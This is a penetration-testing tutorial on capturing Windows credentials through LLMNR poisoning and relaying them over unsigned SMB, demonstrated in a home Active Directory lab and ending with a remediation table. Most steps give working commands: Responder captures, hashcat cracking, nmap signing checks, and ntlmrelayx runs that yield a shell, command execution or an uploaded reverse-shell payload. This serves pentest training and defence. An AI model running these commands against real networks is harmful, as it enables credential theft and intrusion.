LLMNR Poisoning and SMB Relay: catching credentials on the wire

A single mistyped share name is enough. Active Directory's fallback name resolution will broadcast for help, and anyone listening can answer first.

Category: Active Directory Tools: Responder, hashcat, ntlmrelayx

Purpose: a working reference for intercepting NTLM authentication via LLMNR poisoning, cracking what's captured, and relaying it instead when the target allows it. Demonstrated in a home AD lab (Windows Server 2019 DC plus two Windows 10 Enterprise clients, all in VirtualBox on the same NAT network).

Background, In Plain Terms

LLMNR

Link-Local Multicast Name Resolution, enabled by default in Active Directory, is the fallback a client uses when DNS can't resolve a name. It broadcasts to the local network asking anyone to answer. Nothing verifies who actually answers.

SMB relay (pass the hash)

Rather than cracking a captured hash, it can be forwarded live to another machine as proof of authentication, as long as that machine doesn't require SMB signing and the relayed account has admin rights there.

The Reference

1
Find the interface, start listening

Identify the attack box's interface on the lab's NAT network, then start Responder in verbose mode on it:

ip a
responder -I eth0 -v
Why this works

LLMNR broadcasts don't verify the responder's identity, Responder just has to answer before (or instead of) the real resource, which it can do passively on the right network segment.

2
Trigger a lookup and capture the hash

From a Windows client, typing any mistyped share path, starting with a double backslash and ending in a single one, into the Run dialog or Explorer's address bar triggers an LLMNR broadcast on the DNS failure. Responder answers, and the client authenticates straight to it, handing over an NTLMv2 username and password hash in the process, visible in Responder's own console output.

Why this works

This isn't a contrived scenario, it's exactly what happens in a large organization when someone fat-fingers a share path like \\shaere01\Documents\ instead of \\share01\Documents\, or a stale login script points somewhere that no longer exists. LLMNR fires on any DNS failure, typo or not.

3
Identify the hash format, then crack it

nth (name-that-hash, apt install name-that-hash) identifies the format from the captured string and, usefully, tells you which hashcat and John modes to use. An NTLMv2 capture looks like this:

nth -t 'fcastle::MARVEL:b5767a2e087ea531:157C0B6B863C13119F038A5C01F702D7:0101000000000000805C66FF6AB9D801840E548DADCD23980000000002000800300037005200490001001E00570049004E002D0048004F004E004D0041004A0035004D0031004900460004003400570049004E002D0048004F004E004D0041004A0035004D003100490046002E0030003700520049002E004C004F00430041004C000300140030003700520049002E004C004F00430041004C000500140030003700520049002E004C004F00430041004C0007000800805C66FF6AB9D801060004000200000008003000300000000000000001000000002000001C9851B85E8B1F50D2CC6B325325427C08CA439D04EBABC76FA4ACAA8FB6C5F20A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0030002E0032002E00330030000000000000000000'

Alternatively, hashcat's own help menu lists the matching mode. Either way, saving the captured hash to a file and running it against a wordlist is the next move:

nano hash.txt
hashcat -O -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
Why this works

NTLMv2 cracking is dictionary-dependent, a weak or reused password falls quickly, but a strong one won't crack at all against a wordlist. That's exactly why the relay path below matters as a second option.

4
Check if relaying is viable instead of cracking

Relay requires two conditions: SMB signing disabled on the target, and the relayed account holding admin rights there. Nmap's built-in script checks the first across a whole subnet in one pass:

nmap --script=smb2-security-mode.nse -p445 10.0.2.0/24 | grep "smb2-security-mode" -A2 -B8

The target is "SMB signing not required." A domain controller locked down with signing enforced doesn't rule this out entirely, individual workstations on the same network often aren't configured as strictly, and a relay still works between clients even when the DC itself is hardened.

Why this works

SMB signing cryptographically verifies the sender of each SMB packet, which breaks a relay attack outright. Checking signing status per-host before attempting a relay saves time against hosts where it simply won't work.

5
Disable SMB and HTTP in Responder, then relay instead of cracking

Responder has to stop answering SMB and HTTP requests itself, or it'll capture the hash instead of letting it pass through to the relay tool:

nano /etc/responder/Responder.conf

Set SMB and HTTP to Off in that config, restart Responder, then in a separate terminal start ntlmrelayx against the list of signing-disabled targets found in the previous step:

ntlmrelayx.py -tf targets.txt -smb2support

Logging into the Windows client and attempting to reach an invalid share, like \\10.0.2.30, triggers the same LLMNR broadcast as before, except this time the captured authentication gets forwarded live to the real target instead of just logged. The relay output shows the hashes coming through; a reused password here could just as easily unlock something else on the network, like the antivirus console.

Why this works

A relayed hash proves authentication without ever needing the plaintext password, and it works regardless of password strength, since nothing gets cracked. Signing is the only thing standing between a captured hash and a live session.

6
Crack SAM hashes pulled via the relay

SAM hashes are NTLM hashes, which need a different hashcat mode than the NTLMv2 capture earlier:

nano hashes.txt
hashcat -O -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

Once the run finishes, list out whatever cracked:

hashcat -m1000 --show --usernames hashes.txt
Why this works

NTLM (unsalted, unlike NTLMv2) cracks dramatically faster, so hashes pulled via a successful relay are often worth a cracking attempt even when the original captured hash wasn't.

7
Go interactive instead of just relaying once

Adding -i turns the relay into a standing interactive session:

ntlmrelayx.py -tf targets.txt -smb2support -i

Connecting to the local port it opens drops into a shell-like interface:

nc 127.0.0.1 11002
help

From there, get and put move files, most plain Windows commands run directly, and a single command or an uploaded reverse shell can be fired without ever dropping into the interactive session at all:

ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
ntlmrelayx.py -tf targets.txt -smb2support -e "shell.exe"

The uploaded-executable path pairs naturally with msfvenom for generating that payload and msfconsole for catching the callback.

Why this works

A successful relay with local admin rights is already code execution, -i, -c, and -e are just three different ways to spend that access: explore interactively, run one command, or drop a payload.

8
Know when this pays off on a real engagement

Users don't normally type an attacker's interface name by hand, but in a fast-paced organization with hundreds of employees, someone is likely to fat-finger a share path, or a stale login script points at a share that moved or no longer exists, triggering the exact same DNS failure LLMNR falls back on. A good practice during the enumeration phase of an engagement: run Responder in the background right at the start of the business day and again right after lunch, when most logins happen.

Why this works

This is a volume game, not a targeted exploit. Running Responder passively during peak login windows costs nothing and only needs one typo or one stale script anywhere on the network to pay off.

Remediation

ControlTrade-off
Disable LLMNRStops the attack. If not fully possible, require Network Access Control and strong user passwords (14+ chars, no common words) as a fallback
Require SMB signing on all devicesStops the attack; roughly 15% file-copy performance cost
Disable NTLM authenticationStops the attack; if Kerberos ever fails, Windows normally falls back to NTLM, so this removes that fallback entirely
Account tieringLimits domain admins to specific tasks; enforcing the policy can be difficult
Local admin restrictionPrevents most lateral movement; likely increases service-desk tickets
